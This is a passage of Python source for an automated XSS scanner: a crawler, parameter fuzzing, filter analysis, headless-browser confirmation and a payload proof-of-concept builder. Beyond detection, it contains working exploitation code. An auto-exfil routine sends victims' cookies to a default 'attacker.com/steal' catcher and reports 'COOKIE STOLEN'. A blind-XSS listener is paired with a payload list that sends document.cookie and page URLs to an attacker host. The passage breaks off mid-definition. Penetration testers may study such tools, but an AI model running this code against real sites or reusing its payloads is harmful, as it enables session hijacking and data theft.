        # Recon phase 0: Robots & Sitemap
        current_batch.extend(list(self._parse_robots()))
        current_batch.extend(list(self._parse_sitemap()))

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            while current_batch:
                # Split batch into JS vs HTML work items
                js_batch   = [(url[6:], d) for url, d in current_batch
                               if url.startswith("__JS__")]
                html_batch = [(url, d) for url, d in current_batch
                               if not url.startswith("__JS__")]

                futures = {}
                for url, depth in html_batch:
                    futures[pool.submit(self._process_page, url, depth)] = "html"
                for js_url, depth in js_batch:
                    futures[pool.submit(self._process_js, js_url)] = "js"

                current_batch = []
                for fut in as_completed(futures):
                    try:
                        new_links = fut.result()
                        current_batch.extend(new_links)
                    except Exception:
                        pass

                with self._visited_lock:
                    if len(self.visited) >= self.max_pages:
                        current_batch = []
                        break

        # Clear the crawl progress line
        sys.stdout.write("\r" + " " * 65 + "\r")

        spa_note  = f" + {self.spa_count} from JS/SPA" if self.spa_count else ""
        ep_note   = f"{len(self.endpoints)} endpoints"
        tprint(f"  {ok(f'{len(self.visited)} pages crawled{spa_note} — {ep_note} found')}")
        return self.endpoints


# ─────────────────────────────────────────────────────────────────────────────
# PARAMETER DISCOVERY ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class ParamDiscovery:
    MALFORMED = ["'", "\\", "<", "%00", "{{7*7}}", "' OR '1'='1"]
    ERR_PATS  = [
        re.compile(r'(?:parameter|param|field|argument|variable|key|input)\s+[\'"]?([a-zA-Z_][a-zA-Z0-9_]{1,30})[\'"]?', re.I),
        re.compile(r'\b([a-zA-Z_][a-zA-Z0-9_]{1,30})\s+(?:is\s+)?(?:required|missing|invalid|not found|cannot be blank)', re.I),
        re.compile(r'(?:missing|required|unknown|invalid)\s+(?:key|param|field|arg):\s+[\'"]?([a-zA-Z_][a-zA-Z0-9_]{1,30})[\'"]?', re.I),
        re.compile(r'"([a-zA-Z_][a-zA-Z0-9_]{1,30})"\s*:\s*"[^"]*(?:required|invalid|missing)', re.I),
    ]
    NOISE = {
        'true','false','null','none','error','exception','message','stack',
        'trace','line','file','type','object','string','number','boolean',
        'undefined','nan','function','class','method','module'
    }

    def __init__(self, client): self.client = client; self._lock = threading.Lock()

    def _req(self, url, method, params):
        try:
            return (self.client.post(url, params) if method == "POST"
                    else self.client.get(url, params))
        except Exception: return None

    def _baseline(self, url, method):
        r = self._req(url, method, {})
        return ((r["body"] if r else ""),
                (r["status"] if r else 0),
                (len(r["body"]) if r else 0))

    def probe_errors(self, url, method="GET"):
        found = set()
        for probe_val in self.MALFORMED:
            for probe_key in ["q","id","search","input","value","data","__invalid__"]:
                r = self._req(url, method, {probe_key: probe_val})
                if not r: continue
                body = r["body"]
                is_err = (r["status"] >= 400 or
                          any(w in body.lower() for w in
                              ["error","exception","invalid","required",
                               "missing","traceback","syntax"]))
                if not is_err: continue
                for pat in self.ERR_PATS:
                    for m in pat.findall(body):
                        name = m.strip().strip("'\"").lower()
                        if (3 <= len(name) <= 30 and name.isidentifier()
                                and name not in self.NOISE):
                            if name not in found:
                                found.add(name)
                                tprint(f"  {hit_lbl(f'Error probe → {color(name, C.BYELLOW)} @ {url[:55]}')}")
        return list(found)

    def fuzz_wordlist(self, url, method="GET", js_hints=None):
        sentinel = "XS5P" + "".join(random.choices(string.digits, k=5))
        wl = list(COMMON_PARAMS)
        if js_hints:
            for h in js_hints:
                if isinstance(h, str) and h.isidentifier() and h not in wl:
                    wl.insert(0, h)
        base_body, base_status, base_len = self._baseline(url, method)
        if not base_body and base_status == 0: return []
        found = []

        def _test(name):
            r = self._req(url, method, {name: sentinel})
            if not r: return
            diff      = abs(len(r["body"]) - base_len)
            reflected = sentinel in r["body"]
            sc_change = (r["status"] != base_status
                         and r["status"] not in (404, 500))
            name_in   = (bool(re.search(r'\b'+re.escape(name)+r'\b',
                                         r["body"], re.I)) and diff > 20)
            if reflected or sc_change or diff > max(50, base_len * 0.05) or name_in:
                reasons = []
                if reflected:  reasons.append("reflected")
                if sc_change:  reasons.append("status-change")
                if diff > 50:  reasons.append(f"body-diff:{diff}")
                if name_in:    reasons.append("name-in-body")
                with self._lock:
                    found.append({"name": name, "source": "wordlist", "reasons": reasons})

        with ThreadPoolExecutor(max_workers=16) as pool:
            list(pool.map(_test, wl))

        tprint(f"  {ok(f'{len(wl)} wordlist probes → {len(found)} params discovered')}")
        return found

    def sniff_post(self, url):
        found = set()
        for probe in [{"__probe__": "1"}, {"action": "test"}, {}]:
            r = self.client.post(url, probe)
            if not r or r["status"] not in (400, 422, 200): continue
            for pat in self.ERR_PATS:
                for m in pat.findall(r["body"]):
                    name = m.strip().lower()
                    if (3 <= len(name) <= 30 and name.isidentifier()
                            and name not in self.NOISE):
                        found.add(name)
        return list(found)

    def discover(self, url, method, existing=None, js_hints=None):
        all_p = {}
        for p in (existing or []):
            all_p[p] = {"name": p, "source": "crawl"}
        for n in self.probe_errors(url, method):
            if n not in all_p:
                all_p[n] = {"name": n, "source": "error_probe"}
        for p in self.fuzz_wordlist(url, method, js_hints):
            if p["name"] not in all_p:
                all_p[p["name"]] = {"name": p["name"], "source": "wordlist"}
        if method == "POST":
            for n in self.sniff_post(url):
                if n not in all_p:
                    all_p[n] = {"name": n, "source": "post_sniff"}
        return list(all_p.values())


# ─────────────────────────────────────────────────────────────────────────────
# FILTER ANALYZER — characterizes WAF/Sanitizer behavior
# ─────────────────────────────────────────────────────────────────────────────
class FilterAnalyzer:
    """
    Performs lightweight character survivability tests to understand:
    - which characters are blocked
    - which are encoded
    - which pass unchanged
    - event handler separators and tag breakout possibilities
    """
    CHARMAP = {
        "<":     "lt",
        ">":     "gt",
        "'":     "sq",
        "\"":    "dq",
        "/":     "slash",
        "=":     "eq",
        "(":     "lpar",
        ")":     "rpar",
        "`":     "bt",
        ";":     "sem",
    }

    def __init__(self, client):
        self.client = client

    def analyze(self, url, method, param, all_params, hidden):
        """Returns a dict of character behavior: {char: status}"""
        results = {}
        # Test each char individually for clean-signal reflection
        for char, name in self.CHARMAP.items():
            test_val = f"FX{char}X"
            fill = {**{p: "test" for p in all_params if p != param},
                    **(hidden or {}), param: test_val}
            try:
                resp = (self.client.post(url, fill) if method == "POST"
                        else self.client.get(url, fill))
                body = resp.get("body", "")
                if test_val in body:
                    results[char] = "pass"
                elif f"FX{self._escape(char)}X" in body:
                    results[char] = "encoded"
                else:
                    results[char] = "blocked"
            except Exception:
                results[char] = "error"
        return results

    @staticmethod
    def _escape(char):
        return char.replace("<","&lt;").replace(">","&gt;").replace("\"","&quot;").replace("'","&#39;")


# ─────────────────────────────────────────────────────────────────────────────
# PLAYWRIGHT VALIDATOR — runtime browser confirmation
# ─────────────────────────────────────────────────────────────────────────────
class PlaywrightValidator:
    """
    Headless browser validation for high-confidence XSS findings.
    Monitors dialogs, console events, and DOM markers.
    Captures proof (screenshots + DOM snapshots).
    """
    def __init__(self, headless=True, evidence_dir="./evidence"):
        self.headless = headless
        self.evidence_dir = evidence_dir
        if not os.path.exists(evidence_dir):
            os.makedirs(evidence_dir)

    def validate(self, url, method, param, payload, all_params, hidden=None):
        """
        Loads the payload in a real browser.
        Returns (confirmed: bool, screenshot_path: str, events: list).
        """
        if not PLAYWRIGHT_INSTALLED:
            return False, None, ["playwright-not-installed"]

        confirmed = False
        events = []
        screenshot_path = None
        
        # Build the URL (only handles GET for now, POST requires more complex setup)
        if method != "GET":
            return False, None, ["playwright-get-only-for-now"]

        p_url = PoC.browser(url, method, param, payload, all_params, hidden)
        
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=self.headless)
                context = browser.new_context(ignore_https_errors=True)
                page = context.new_page()

                # Event handlers
                def on_dialog(dialog):
                    nonlocal confirmed
                    confirmed = True
                    events.append(f"dialog:{dialog.type}:{dialog.message}")
                    dialog.dismiss()

                def on_console(msg):
                    nonlocal confirmed
                    if "alert" in msg.text.lower() or "xs5" in msg.text.lower():
                        confirmed = True
                    events.append(f"console:{msg.type}:{msg.text[:50]}")

                page.on("dialog", on_dialog)
                page.on("console", on_console)

                try:
                    page.goto(p_url, timeout=10000, wait_until="load")
                    # Extra wait for async payloads
                    page.wait_for_timeout(2000)
                except Exception as e:
                    events.append(f"page-load-error:{str(e)[:50]}")

                if confirmed:
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    safe_param = "".join(c for c in param if c.isalnum())
                    fname = f"xss_{safe_param}_{ts}.png"
                    screenshot_path = os.path.join(self.evidence_dir, fname)
                    page.screenshot(path=screenshot_path)
                    
                browser.close()
        except Exception as e:
            events.append(f"playwright-error:{str(e)[:50]}")

        return confirmed, screenshot_path, events


# ─────────────────────────────────────────────────────────────────────────────
# CONFIDENCE SCORER
# ─────────────────────────────────────────────────────────────────────────────
class Scorer:
    """Calculates a confidence score (0-100) based on multiple heuristics."""
    @staticmethod
    def calculate(sigs, how, ctx, confirmed, pw_confirmed=False):
        score = 0
        # Reflection quality (0-30)
        if how == "exact":    score += 30
        elif how == "case":   score += 20
        elif "fragment" in how: score += 10
        
        # Context (0-20)
        if ctx == "js":       score += 20
        elif ctx == "attr":   score += 15
        elif ctx == "html":   score += 10
        
        # Signals (0-30)
        for sig in sigs:
            if "pattern:" in sig: score += 10
        score = min(score, 80) # Cap before browser confirm
        
        # Browser confirmation (0-20 bonus)
        if pw_confirmed:
            score = 100
        elif confirmed:
            score += 20
            
        return min(max(score, 0), 100)


# ─────────────────────────────────────────────────────────────────────────────
# XSS VERIFIER  v2  — context-aware, low false-negative, 5-stage
# ─────────────────────────────────────────────────────────────────────────────
class XSSVerifier:
    """
    5-stage verification pipeline — designed to FIND vulns not miss them:

    Stage 1  SEND    — inject payload, get response
    Stage 2  REFLECT — is any form of the payload in the body?
                        • exact match
                        • case-insensitive match
                        • partial key fragment (handles tag-split responses)
    Stage 3  PATTERN — does the response contain a live XSS confirm pattern?
                        OR does a reflection appear in a non-escaped context?
    Stage 4  ESCAPE  — is the reflection HTML-encoded? (only reject if FULLY escaped)
    Stage 5  CONTROL — does a neutral value also trigger patterns?
                        (removes false positives from pages with existing XSS patterns)

    Key improvements over v1:
      • case_reflection alone IS enough to confirm when a pattern also matches
      • Escape check only rejects when payload is ONLY in escaped form
      • Control check diffs against the ACTUAL baseline, not a new request
      • Context detection: detects HTML/attr/JS reflection context
      • Fragment check: if any unique fragment of payload appears unescaped,
        counts as partial reflection (catches tag-split sanitizers)
      • Adds xss_type to each finding: reflected_html / reflected_attr /
        reflected_js / reflected_url / partial_bypass
    """

    # Unique short fragments that indicate real injection in body
    _FRAGS = [
        "<script>", "<svg", "<img", "<iframe", "onerror=", "onload=",
        "alert(", "alert`", "javascript:", "onfocus=", "ontoggle=",
        "onmouseover=", "confirm(", "prompt(", "document.cookie",
    ]

    def __init__(self, client):
        self.client   = client
        self._baseline_cache = {}  # url+method → baseline body (avoid re-fetching)

    def _send(self, url, method, params):
        try:
            return (self.client.post(url, params) if method == "POST"
                    else self.client.get(url, params))
        except Exception: return None

    # ── Context detection ─────────────────────────────────────────────────────
    @staticmethod
    def _detect_context(body, param_val):
        """
        Detect where in the response param_val appears.
        Returns one of: "html" | "attr" | "js" | "url" | "unknown"
        """
        pos = body.lower().find(param_val.lower())
        if pos == -1: return "unknown"
        pre = body[max(0, pos-120):pos]
        if re.search(r'(?:href|src|action|data|value|content)\s*=\s*["a-z][^"]*$', pre, re.I):
            return "attr"
        if re.search(r'(?:<script[^>]*>|javascript:)[^<]*$', pre, re.I):
            return "js"
        if re.search(r'url\s*\(', pre, re.I):
            return "url"
        return "html"

    # ── Reflection detection (permissive) ─────────────────────────────────────
    def _reflected(self, body, payload):
        """
        Returns (reflected: bool, how: str, context: str).
        'how' is one of: exact / case / fragment / none
        """
        if payload in body:
            return True, "exact", self._detect_context(body, payload)
        if payload.lower() in body.lower():
            return True, "case", self._detect_context(body, payload.lower())
        # Fragment check — any distinctive XSS fragment from payload in body
        pl_lower = payload.lower()
        for frag in self._FRAGS:
            if frag in pl_lower and frag in body.lower():
                return True, "fragment:" + frag, "html"
        return False, "none", "unknown"

    # ── Escape check (precise) ────────────────────────────────────────────────
    @staticmethod
    def _fully_escaped(body, payload):
        """
        Returns True ONLY if the payload is present exclusively in HTML-escaped form.
        Does NOT return True if raw payload also appears.
        """
        if payload in body:
            return False   # raw version present → not fully escaped
        esc_variants = [
            payload.replace("<","&lt;").replace(">","&gt;").replace('"','&quot;').replace("'","&#39;"),
            payload.replace("<","&lt;").replace(">","&gt;"),
            payload.replace('"','&quot;'),
        ]
        body_lower = body.lower()
        pl_lower   = payload.lower()
        return any(v.lower() in body_lower for v in esc_variants) and pl_lower not in body_lower

    # ── Pattern check (diff against baseline) ────────────────────────────────
    def _new_patterns(self, body, baseline_body, payload):
        """
        Find XSS confirm patterns that appear in `body` but NOT in `baseline_body`.
        Returns list of matched pattern strings.
        Diffing against baseline eliminates FP from pages with existing scripts.
        """
        hits = []
        for pat in XSS_CONFIRM_RE:
            in_body     = bool(pat.search(body))
            in_baseline = bool(pat.search(baseline_body))
            if in_body and not in_baseline:
                hits.append("pattern:" + pat.pattern[:30])
        return hits

    # ── URL-only check (fixed logic) ──────────────────────────────────────────
    def _only_in_url_attrs(self, body, payload):
        """
        Returns True ONLY when every occurrence of the payload is inside
        a URL-type attribute (href=, src=, action=). 
        Returns False (don't suppress) when any clean occurrence exists.
        """
        pl_lower = payload.lower()
        positions = [m.start() for m in re.finditer(re.escape(pl_lower), body.lower())]
        if not positions: return False
        clean_count = 0
        for pos in positions:
            ctx = body[max(0, pos-150):pos+len(payload)+10]
            pat_str = r'(?:href|src|action)\s*=\s*[^>]*' + re.escape(pl_lower[:12])
            in_url_attr = bool(re.search(pat_str, ctx, re.I))

            if not in_url_attr:
                clean_count += 1
        return clean_count == 0   # all occurrences are inside URL attrs

    # ── Main verify ───────────────────────────────────────────────────────────
    def verify(self, url, method, param, all_params, payload,
               baseline_body, hidden=None):
        """
        Returns (confirmed: bool, signals: list[str], response | None).

        confirmed=True means the payload executed or is highly likely executable.
        signals describe what was found (for reporting).
        """
        # ── Stage 1: Send ────────────────────────────────────────────────────
        fill = {**{p: "test" for p in all_params if p != param},
                **(hidden or {}), param: payload}
        resp = self._send(url, method, fill)
        if not resp: return False, [], None
        body = resp["body"]
        sigs = []

        # ── Stage 2: Reflection check ────────────────────────────────────────
        reflected, how, ctx = self._reflected(body, payload)
        if not reflected:
            return False, [], resp
        sigs.append(f"reflect:{how}:{ctx}")

        # ── Stage 3: Fully escaped? → reject ────────────────────────────────
        if self._fully_escaped(body, payload):
            return False, ["escaped"], resp

        # ── Stage 4: Diff patterns against baseline ──────────────────────────
        new_pats = self._new_patterns(body, baseline_body, payload)
        sigs.extend(new_pats)

        # ── Stage 5: URL-only? → reject if no new patterns found ────────────
        if self._only_in_url_attrs(body, payload) and not new_pats:
            return False, ["url_only"], resp

        # ── Confirm decision ─────────────────────────────────────────────────
        # Confirm if:  new patterns appeared  OR  exact/case reflection in HTML/attr/JS ctx
        #              (URL context alone is not confirmed without a pattern)
        has_pattern    = bool(new_pats)
        good_ctx       = ctx in ("html", "attr", "js")
        exact_or_case  = how in ("exact", "case")
        fragment_match = how.startswith("fragment:")

        confirmed = (
            has_pattern or                        # new XSS pattern appeared
            (exact_or_case and good_ctx) or       # raw payload in live context
            (fragment_match and has_pattern)      # fragment + pattern
        )

        return confirmed, sigs, resp

    def verify_stored(self, token, url):
        """Check if a stored XSS token appears unescaped in a retrieval URL."""
        try:
            resp = self.client.get(url)
            body = resp.get("body", "")
            if token not in body: return False
            esc = token.replace("<","&lt;").replace(">","&gt;")
            return not (esc in body and token not in body)
        except Exception: return False

# ─────────────────────────────────────────────────────────────────────────────
# PoC BUILDER
# ─────────────────────────────────────────────────────────────────────────────
class PoC:
    @staticmethod
    def _qs(param, payload, all_params, hidden):
        all_p = {**{p: "test" for p in all_params}, **(hidden or {})}
        enc   = urllib.parse.quote(payload, safe="")
        parts = []
        for k, v in all_p.items():
            parts.append(urllib.parse.quote(k) + "=" +
                         (enc if k == param
                          else urllib.parse.quote(str(v))))
        if param not in all_p:
            parts.append(urllib.parse.quote(param) + "=" + enc)
        return "&".join(parts)

    @staticmethod
    def curl(url, method, param, payload, all_params, hidden=None):
        qs = PoC._qs(param, payload, all_params, hidden)
        if method == "GET":
            return f'curl -sk "{url}?{qs}"'
        return f'curl -sk -X POST "{url}" \\\n  -d "{qs}"'

    @staticmethod
    def browser(url, method, param, payload, all_params, hidden=None):
        if method != "GET": return None
        return url + "?" + PoC._qs(param, payload, all_params, hidden)

    @staticmethod
    def cookie_pocs(url, method, param, all_params, catcher, hidden=None):
        pocs = []
        for pd in PAYLOADS:
            if pd["type"] != "cookie": continue
            pl = pd["pl"].replace("CATCHER", catcher)
            pocs.append({
                "desc":    pd["id"],
                "curl":    PoC.curl(url, method, param, pl, all_params, hidden),
                "browser": PoC.browser(url, method, param, pl, all_params, hidden),
                "raw":     pl,
            })
        return pocs


# ─────────────────────────────────────────────────────────────────────────────
# XSS TESTER  — HELLHOUND-style output + progress bars
# ─────────────────────────────────────────────────────────────────────────────
class XSSTester:
    def __init__(self, client, tier=5, delay=0.0,
                 catcher="https://attacker.com/steal"):
        self.client   = client
        self.tier     = tier
        self.delay    = delay
        self.catcher  = catcher
        self.verifier = XSSVerifier(client)
        self.analyzer = FilterAnalyzer(client)
        self.pw       = PlaywrightValidator(headless=True)
        self.findings = []
        self._lock    = threading.Lock()
        self._catcher_obj = None

    def _baseline(self, url, method, params, hidden):
        try:
            r = (self.client.post(url, {**hidden, **params}) if method == "POST"
                 else self.client.get(url, params))
            return r["body"] if r else ""
        except Exception: return ""

    def _print_hit(self, url, method, param, payload, sigs,
                   sc, burl, ck_pocs, score, stolen=None, pw_ev=None):
        """HELLHOUND-style finding display."""
        sys.stdout.write("\r" + " " * 65 + "\r")
        tprint(f"\n  {color('VULN', C.BRED, C.BOLD)} {color(method, C.BYELLOW)} {color(url, C.BWHITE)}")
        tprint(f"  {color('  param   :', C.DIM)} {color(param, C.BRED, C.BOLD)}")
        tprint(f"  {color('  score   :', C.DIM)} {color(str(score)+'%', C.BGREEN if score >= 80 else C.BYELLOW, C.BOLD)}")
        tprint(f"  {color('  payload :', C.DIM)} {color(payload[:100], C.BRED)}")
        tprint(f"  {color('  signals :', C.DIM)} {color(', '.join(sigs[:4]), C.BGREEN)}")
        if pw_ev:
            tprint(f"  {color('  browser :', C.DIM)} {color('CONFIRMED via Playwright', C.BCYAN, C.BOLD)}")
            for ev in pw_ev: tprint(f"    {color('↳', C.DIM)} {color(ev, C.DIM)}")
        tprint(f"  {color('  status  :', C.DIM)} {color(str(sc), C.BWHITE)}")
        if burl:
            tprint(f"  {color('  browser :', C.DIM)} {color(burl, C.BCYAN)}")
        if stolen:
            tprint(f"  {color('  cookie  :', C.DIM)} {color(stolen, C.fg(214), C.BOLD)}")
        elif ck_pocs:
            cp = ck_pocs[0]
            tprint(f"  {color('  ck-exfil:', C.DIM)} {color(cp.get('browser',''), C.BRED)}")

    def _auto_exfil(self, ck_pocs, catcher_obj):
        """Agent visits the XSS URL and waits for cookie to arrive."""
        if not ck_pocs or not catcher_obj: return None
        for cp in ck_pocs:
            burl = cp.get("browser")
            if not burl: continue
            before = len(CookieCatcher.caught)
            try: self.client.get_raw(burl)
            except Exception: pass
            deadline = time.time() + 4.0
            while time.time() < deadline:
                with CookieCatcher._lock:
                    if len(CookieCatcher.caught) > before:
                        return CookieCatcher.caught[-1]["cookie"]
                time.sleep(0.15)
        return None

    def _probe_context(self, url, method, param, all_params, hidden):
        """
        Send a unique canary value to detect where the param is reflected.
        Returns: "html" | "attr" | "js" | "url" | "unknown" | "none"
        """
        canary = "XS5CTX" + "".join(random.choices(string.ascii_lowercase, k=6))
        fill   = {**{p: "test" for p in all_params if p != param},
                  **(hidden or {}), param: canary}
        try:
            resp = (self.client.post(url, fill) if method == "POST"
                    else self.client.get(url, fill))
            body = resp.get("body", "")
            if canary not in body: return "none"
            return XSSVerifier._detect_context(body, canary)
        except Exception:
            return "unknown"

    @staticmethod
    def _prioritise_payloads(payloads, ctx, tier_cap):
        """
        Re-order payload list to put context-appropriate payloads first.
        Payloads for the detected context fire first → faster confirmation.
        Falls back to all payloads after context-specific ones.
        """
        # Context → best payload types to try first
        ctx_types = {
            "html":    ["html", "poly", "mxss"],
            "attr":    ["attr", "html", "poly"],
            "js":      ["js",   "poly", "attr"],
            "url":     ["html", "attr"],
            "unknown": ["html", "attr", "js", "poly", "mxss"],
            "none":    ["html", "attr", "js", "poly", "mxss"],
        }
        priority = ctx_types.get(ctx, ctx_types["unknown"])
        tier_ok  = [p for p in payloads
                    if p["tier"] <= tier_cap and p["type"] != "cookie"]
        first  = [p for p in tier_ok if p["type"] in priority]
        rest   = [p for p in tier_ok if p["type"] not in priority]
        return first + rest

    def test_endpoint(self, n, tot, url, method, params, hidden):
        pnames   = list(params.keys())
        baseline = self._baseline(url, method, params, hidden)

        sys.stdout.write(
            f"\r  {color(f'  [{n}/{tot}] {method} {url[:55]}', C.DIM)}  ")
        sys.stdout.flush()

        for param in pnames:
            param_confirmed = False

            # ── Filter analysis: check which chars survive ───────────────────
            filter_map = self.analyzer.analyze(url, method, param, pnames, hidden)
            
            # ── Context probe: detect where this param is reflected ───────────
            ctx = self._probe_context(url, method, param, pnames, hidden)

            # ── Context-prioritised payload order ────────────────────────────
            ordered = self._prioritise_payloads(PAYLOADS, ctx, self.tier)

            for pd in ordered:
                if param_confirmed: break
                payload = pd["pl"]
                confirmed, sigs, resp = self.verifier.verify(
                    url, method, param, pnames, payload, baseline, hidden)
                if self.delay: time.sleep(self.delay)
                if not confirmed: continue

                param_confirmed = True
                sc     = resp["status"] if resp else 0
                burl   = PoC.browser(url, method, param, payload, pnames, hidden)
                curl_c = PoC.curl(url, method, param, payload, pnames, hidden)
                ck_pocs= PoC.cookie_pocs(url, method, param, pnames,
                                          self.catcher, hidden)
                stolen = self._auto_exfil(ck_pocs, self._catcher_obj)
                if stolen:
                    tprint(f"\n  {ck_lbl('COOKIE STOLEN  ←  auto-exfil')}")
                    tprint(f"  {color('  '+stolen, C.fg(214), C.BOLD)}")

                # ── Step 6: Browser validation for high confidence ───────────
                pw_confirmed = False
                pw_ev = []
                screenshot = None
                if confirmed and ctx in ("html", "attr", "js"):
                    pw_confirmed, screenshot, pw_ev = self.pw.validate(
                        url, method, param, payload, pnames, hidden)

                # ── Step 7: Final Scoring ────────────────────────────────────
                score = Scorer.calculate(sigs, how, ctx, confirmed, pw_confirmed)

                # Classify XSS type from signals
                xss_type = "reflected_" + ctx if ctx not in ("none","unknown") else "reflected"
                for s in sigs:
                    if "mxss" in pd.get("type",""):  xss_type = "mutation"; break
                    if "uxss" in pd.get("type",""):  xss_type = "uxss";     break

                f_entry = {
                    "url": url, "method": method, "param": param,
                    "payload": payload, "payload_id": pd["id"],
                    "tier": pd["tier"], "type": pd["type"],
                    "xss_type": xss_type, "context": ctx,
                    "signals": sigs, "confirmed": confirmed, 
                    "pw_confirmed": pw_confirmed, "pw_events": pw_ev,
                    "screenshot": screenshot, "score": score,
                    "status": sc, "curl": curl_c, "browser": burl,
                    "cookie_pocs": ck_pocs, "exfil_cookie": stolen,
                    "ts": datetime.now().isoformat(),
                }
                with self._lock:
                    self.findings.append(f_entry)
                self._print_hit(url, method, param, payload, sigs, sc,
                                burl, ck_pocs, score, stolen, pw_ev)

    def run(self, endpoints, catcher_obj=None, threads=8):
        self._catcher_obj = catcher_obj
        section("PHASE 4/4 — XSS TESTING & VERIFICATION", "⚡")
        total = sum(len(ep["params"]) for ep in endpoints)
        tprint(f"  {info(f'{len(endpoints)} endpoints · {total} parameters · {threads} workers')}")
        tprint(f"  {info(f'Tier cap: {self.tier} | Cookie exfil: {bool(catcher_obj)}')}\n")

        done_count = [0]
        tot        = len(endpoints)

        def _run_ep(args_tuple):
            i, ep = args_tuple
            self.test_endpoint(i, tot,
                               ep["url"], ep["method"],
                               ep["params"], ep.get("hidden", {}))
            with self._lock:
                done_count[0] += 1
            sys.stdout.write(f"\r  {progress(done_count[0], tot)}  ")
            sys.stdout.flush()

        workers = min(threads, len(endpoints)) if endpoints else 1
        with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
            list(pool.map(_run_ep, enumerate(endpoints, 1)))

        sys.stdout.write("\r" + " " * 65 + "\r")
        return self.findings



# ─────────────────────────────────────────────────────────────────────────────
# BLIND XSS OOB LISTENER  — self-hosted callback for out-of-band detection
# Listens on a random port; payloads POST/GET to it with a token.
# Confirms stored/blind XSS without needing a browser.
# ─────────────────────────────────────────────────────────────────────────────
class BlindXSSServer:
    """
    Embeds a lightweight HTTP server.  Blind XSS payloads carry BTOKEN in
    the URL: http://ATTACKER:PORT/?b=BTOKEN&p=PARAM&u=URL
    Any incoming hit with b=BTOKEN is a confirmed blind XSS execution.
    """
    def __init__(self, port=0):
        self._hits   = []
        self._lock   = threading.Lock()
        self._server = None
        self._thread = None
        self.url     = None
        self.port    = port

    @staticmethod
    def _local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
            return ip
        except Exception: return "127.0.0.1"

    def start(self):
        srv_ref = self
        class _H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                qs = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
                token = qs.get("b", [""])[0]
                param = qs.get("p", ["?"])[0]
                src   = qs.get("u", ["?"])[0]
                ua    = self.headers.get("User-Agent","")
                ts    = datetime.now().strftime("%H:%M:%S")
                with srv_ref._lock:
                    srv_ref._hits.append({"token":token,"param":param,
                                          "src":src,"ua":ua,"ts":ts})
                tprint(f"\n  {color('BLIND XSS HIT', C.BRED, C.BOLD)}  "
                       f"{color(ts, C.DIM)}")
                tprint(f"  {color('  param :', C.DIM)} {color(param, C.BRED, C.BOLD)}")
                tprint(f"  {color('  src   :', C.DIM)} {color(src[:70], C.BCYAN)}")
                tprint(f"  {color('  UA    :', C.DIM)} {color(ua[:60], C.DIM)}\n")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")
            def log_message(self,*a): pass
        try:
            self._server = http.server.HTTPServer(("0.0.0.0", self.port), _H)
            self.port    = self._server.server_address[1]
            ip           = self._local_ip()
            self.url     = f"http://{ip}:{self.port}"
            self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
            self._thread.start()
            return self.url
        except Exception as e:
            tprint(f"  {warn(f'BlindXSS server failed: {e}')}")
            return None

    def poll(self, token, timeout=5.0):
        dl = time.time() + timeout
        while time.time() < dl:
            with self._lock:
                for h in self._hits:
                    if h["token"] == token: return True, h
            time.sleep(0.2)
        return False, {}

    def stop(self):
        if self._server: self._server.shutdown()


# ─────────────────────────────────────────────────────────────────────────────
# BLIND XSS PAYLOADS  — OOB callback payloads (replaced at runtime)
# BURL  = http://attacker:port
# BTOKEN = unique token per scan
# BPARAM = param name being tested
# BSRC   = source URL being tested
# ─────────────────────────────────────────────────────────────────────────────
BLIND_PAYLOADS = [
    # Template strings — BURL/BTOKEN/BPARAM replaced at runtime by BlindXSSTester
    # All use double-quoted attribute values; inner JS uses no quotes
    "<script>fetch('BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(location.href))</script>",
    "<svg onload=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(location.href))>",
    "<img src=x onerror=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(location.href))>",
    "<script>new Image().src='BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie)</script>",
    "<body onload=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+location.href)>",
    "<input autofocus onfocus=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+location.href)>",
    "<details open ontoggle=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+location.href)>",
    "<iframe src=javascript:new Image().src='BURL/?b=BTOKEN&p=BPARAM'>",
    "<script>var x=new XMLHttpRequest();x.open('GET','BURL/?b=BTOKEN&p=BPARAM&u='+location.href,true);x.send()</script>",
    "<script>document.location='BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(document.cookie)</script>",
    "<script>setTimeout(function(){fetch('BURL/?b=BTOKEN&p=BPARAM&u='+location.href)},500)</script>",
]


# ─────────────────────────────────────────────────────────────────────────────
# DOM XSS  — client-side sink detection via JS pattern analysis
# Scans page source for dangerous sinks receiving URL-controllable sources.
# Also probes with marker values to detect DOM reflection without server echo.
# ─────────────────────────────────────────────────────────────────────────────
class DOMXSSScanner:
    """
    Two strategies:
      A) Static: scan JS source for sink(source) patterns without server round-trip.
         Detects assignments like: element.innerHTML = location.hash
      B) Dynamic probe: inject a marker into URL params, fetch the page,
         search for unescaped marker in the rendered HTML (server-side DOM reflection).
         This catches server-rendered DOM contexts (SSR frameworks, template literals).
    """

    # Dangerous JS sinks that execute HTML/JS
    SINKS = re.compile(
        r"(?:"
        r"\.innerHTML|\.outerHTML|\.insertAdjacentHTML|document\.write|document\.writeln"
        r"|eval|setTimeout|setInterval"
        r"|location\.href|location\.replace|location\.assign"
        r"|\.html\s*\(|\.append\s*\(|\.prepend\s*\(|\.after\s*\(|\.before\s*\("
        r"|jQuery\s*\("
        r")",
        re.I)

    # URL-controllable DOM sources
    SOURCES = re.compile(
        r"(?:location\.(?:hash|search|href|pathname)|document\.(?:URL|referrer|baseURI)"
        r"|window\.name|document\.cookie"
        r"|URLSearchParams|getParameter\s*\(|\.search\b)",
        re.I)

    # High-risk combined sink+source on same line (strong indicator)
    COMBINED = re.compile(
